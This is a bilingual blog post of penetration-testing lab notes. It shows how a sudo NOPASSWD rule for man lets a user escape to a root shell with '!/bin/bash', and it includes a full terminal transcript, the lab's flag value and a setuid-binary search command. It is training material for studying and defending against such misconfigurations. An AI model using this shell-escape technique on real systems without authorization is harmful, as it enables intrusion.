---
layout: post
title: "Linux Privilege Escalation - SUDO Privileges"
date: "2023-06-30"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - Post-Exploitation
---

# Linux Privilege Escalation - SUDO Privileges（Linux权限提升 - SUDO权限）
# Demo: Linux Privilege Escalation - SUDO Privileges（演示：Linux权限提升 - SUDO权限）
We're going to be exploring the process of identifying binaries or executables with misconfigured sudo privileges that can be used to elevate our privileges on a Linux system.

It will automatically give you access to a user account, a nonprivileged user account on the target system.

Perform your typical enumeration like identifying what other users are on the system.

```
cat /etc/passwd
```

The only other user account is the root user here. The rest of them are all service accounts.

We're primarily going to be focused on identifying misconfigured sudo privileges or permissions.

In order to identify what commands we can run, we can utilize the `sudo -l` option.

```
sudo -l
```

It's going to give you a list of commands the student user can run.

```
User student may run the following commands on attackdefense:
    (root) NOPASSWD: /usr/bin/man
```

As the user root without providing a password, the student user account can execute the following binary. The binary in this case that we can execute with sudo privileges is the man binary. man on Linux is the manual utility that provides you with access or allows you to view the manual files for utilities. The man utility if misconfigured with sudo privileges. In this case, the NOPASSWD option has been set. It means that the unprivileged student user account can run the man binary with sudo privileges, which means root privileges without providing the password of the root user. If I can compare it to Windows, it's like executing a program as administrator through a non privileged user account that is not part of the local administrators group and not providing a password. This is bypassing the entire concept of permissions and privileges.

Why is this the case? On a Linux system, in some cases, the administrator may need to provide this privilege for specific binaries. In this case, it looks harmless. The man utility is only used to view the manual files or the documentation of other utilities. **The man utility can allow users to spawn a bash session or a shell session from within the utility.**

Let's get an understanding of how man works.

```
man ls
```

This will open up the manual for that particular command.

The way an attacker can exploit this is they can run it with sudo privilege.

```
sudo man cat
```

If the permissions or the privileges that we were able to enumerate earlier were correct, and it should execute the man binary or utility with sudo privileges without prompting me to enter the root user's password.

There is a vulnerability that can be exploited here.

```
sudo man ls
```

We can spawn a bash session by utilizing the exclamation mark.

```
!/bin/bash
```

Because the man binary is running with sudo or root privileges, whatever we execute from within man will be executed with those privileges. In this case, we should receive a bash session with root privileges. We have elevated our privileges successfully.

```
cd /root
ls
cat flag
id
sudo -l
```

We've successfully been able to elevate our privileges on a Linux system.

The reason why I wanted to showcase this particular vulnerability is primarily because this is one that you will run across quite a lot. What typically happens is the administrator of the system will be informed by other users that are also using the Linux server. And they will ask him to set specific sudo privileges for specific binaries that they need to run with sudo privileges.

If we go back to the student accounts

```
su student
/bin/bash -i
sudo -l
```

The issue here is with specific binaries on Linux, in addition to performing the functionality that they were developed for, they can also be used to execute specific commands. In the case of man, we are able to execute or to launch a bash session. And if the man utility or binary or rather any binary that has been configured with the following sudo privileges, runs with those privileges then that means whatever we execute will be executed as the root user. And in order to elevate our privileges, all that we needed to do was just say we want to launch a bash session. And because that command was executed with root privileges, it opened up a bash session with those privileges. 

```
sudo man cd
sudo man nano
sudo man vim
```

```
!/bin/bash
```

We've successfully elevated our privileges.

# Editing Gone Wrong
## Overview
You have managed to get access to the "student" account on the client's server. This is bad enough as all the student resources are available to you. You are now trying to escalate privileges to get root. After some digging around and from other sources, you figure out that the same person in the organization uses both the student account and the root account on the system. 

Your mission is to escalate privileges, get a root shell on the box and retrieve the flag!

## Solutions
The solution for this lab can be found in the following manual: https://assets.ine.com/labs/ad-manuals/walkthrough-80.pdf

# 编辑出了问题
## 概述
您已成功访问客户服务器上的“学生”帐户。这已经很糟糕了，因为您可以访问所有学生资源。现在，您正在尝试升级特权以获取 root 权限。经过一番搜索和来自其他来源的信息，您发现组织中的同一人使用系统上的学生帐户和 root 帐户。

您的任务是升级特权，在该服务器上获取 root shell 并检索标志！

## 解决方案
此实验室的解决方案可以在以下手册中找到：https://assets.ine.com/labs/ad-manuals/walkthrough-80.pdf

## 复现视频内容

```
student@attackdefense:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
student:x:999:999:student:/home/app:/bin/sh
student@attackdefense:~$ id
uid=999(student) gid=999(student) groups=999(student)
student@attackdefense:~$ whoami
student
student@attackdefense:~$ groups
student
student@attackdefense:~$ groups student
student : student
```

`sudo -l` 是用来列出当前用户可以使用 `sudo` 命令执行的权限列表。当用户在终端中执行 `sudo -l` 命令时，系统会检查 `/etc/sudoers` 文件中的配置，以确定该用户是否被授权执行某些命令或程序。如果用户有权限，则会显示出该用户可以执行的命令列表。如果用户没有权限，则会显示出相应的错误信息。

```
student@attackdefense:~$ sudo -l
Matching Defaults entries for student on attackdefense:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User student may run the following commands on attackdefense:
    (root) NOPASSWD: /usr/bin/man
```

```
student@attackdefense:~$ man ls
```

```
student@attackdefense:~$ sudo man cat
```

```
student@attackdefense:~$ sudo man ls
```

```
!/bin/bash
root@attackdefense:~# cd /root
root@attackdefense:/root# ls
flag
root@attackdefense:/root# cat flag
74f5cc752947ec8a522f9c49453b8e9a
root@attackdefense:/root# sudo -l
Matching Defaults entries for root on attackdefense:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User root may run the following commands on attackdefense:
    (ALL : ALL) ALL
root@attackdefense:/root# id
uid=0(root) gid=0(root) groups=0(root)
```

```
root@attackdefense:/root# su student
$ /bin/bash -i
student@attackdefense:/root$ sudo -l
Matching Defaults entries for student on attackdefense:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User student may run the following commands on attackdefense:
    (root) NOPASSWD: /usr/bin/man
```

```
student@attackdefense:/root$ sudo man cd
No manual entry for cd
student@attackdefense:/root$ sudo man nano
No manual entry for nano
student@attackdefense:/root$ sudo man vim
```

```
!/bin/bash
root@attackdefense:/root# id
uid=0(root) gid=0(root) groups=0(root)
root@attackdefense:/root# whoami
root
```

```bash
find / -user root -perm -4000 -exec ls -ldb {} \;
```

这个命令会在整个文件系统中查找属主为root且设置了setuid位的文件，并使用`ls -ldb`命令以长格式列出这些文件的详细信息。

- `find /` ：从根目录开始查找文件
- `-user root` ：查找属主为root的文件
- `-perm -4000` ：查找设置了setuid位的文件
- `-exec ls -ldb {} \;` ：对于每个找到的文件，执行`ls -ldb`命令并将其详细信息输出到终端上。`{}`表示找到的文件名，`\;`表示命令结束。

Anomaly 指的是偏离正常或预期的事物。它可以是一种不寻常的事件、行为或情况，与通常的模式或趋势不同。在数据分析中，异常可以是一个离群值或与数据集中其余数据点显著不同的数据点。

Depicts 意为描绘或描述。它通常用于说明一幅图片、绘画或照片所展现的内容，或者描述一件事情的细节和特征。该词语也可以用于说明一部电影或小说中的场景、角色或情节。


